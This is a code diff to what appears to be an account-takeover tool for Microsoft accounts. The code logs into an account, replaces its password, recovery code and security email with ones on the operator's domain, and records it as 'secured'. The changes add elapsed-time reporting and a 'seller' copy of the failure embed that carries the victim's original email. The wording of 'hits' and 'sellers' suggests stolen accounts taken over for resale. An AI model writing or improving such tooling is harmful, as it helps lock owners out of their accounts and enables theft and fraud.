@@ -64,6 +64,8 @@ async def _secure_after_password_login(
     email: str,
     password: str,
     rextra: dict,
+    *,
+    elapsed: float = 0.0,
 ) -> dict:
     """Finish securing using the new password (no OTP).
 
@@ -211,7 +213,7 @@ async def _secure_after_password_login(
     with DBConnection() as db:
         db.add_secured_account(account_id, secured)
 
-    return await build_account_embeds(secured, 0, account_id)
+    return await build_account_embeds(secured, elapsed, account_id)
 
 
 def _failure_result(
@@ -232,27 +234,40 @@ def _failure_result(
             "security_email": security_email or "Couldn't Change!",
             "password": password or "Couldn't Change!",
             "recovery_code": recovery_code or "Couldn't Change!",
+            "original_email": email,
         }
     else:
         ms = {
             "security_email": "Couldn't Change!",
             "password": "Couldn't Change!",
             "recovery_code": recovery_code or "Couldn't Change!",
+            "original_email": email,
         }
     detail = error or reason
+    hit = build_failure_embed(
+        email,
+        ms,
+        reason,
+        error=detail,
+        credentials_changed=credentials_changed,
+    )
+    # Seller-facing copy always uses the submitted/original email (never sunny@).
+    seller = build_failure_embed(
+        email,
+        {**ms, "email": email},
+        reason,
+        error=detail,
+        credentials_changed=credentials_changed,
+    )
     return {
         "failed": True,
         "reason": reason,
         "error": detail,
         "fallback_otp": fallback_otp,
         "credentials_changed": credentials_changed,
-        "hit_embed": build_failure_embed(
-            email,
-            ms,
-            reason,
-            error=detail,
-            credentials_changed=credentials_changed,
-        ),
+        "microsoft": ms,
+        "hit_embed": hit,
+        "seller_embed": seller,
     }
 
 
@@ -332,7 +347,7 @@ async def recovery_secure(
             sname = uuid.uuid4().hex[:16]
             # Letters+digits, mixed case — no symbols
             password = generate_ms_password(14)
-            security_email = f"{sname}@{config["domain"]}"
+            security_email = f"{sname}@{config['domain']}"
             print(f"[+] - Generated Security Email ({security_email})")
 
             with DBConnection() as database:
@@ -462,7 +477,11 @@ async def recovery_secure(
 
                     async def _pwd_login(s):
                         return await _secure_after_password_login(
-                            s, email, password, rextra
+                            s,
+                            email,
+                            password,
+                            rextra,
+                            elapsed=time() - initialTime,
                         )
 
                     try:
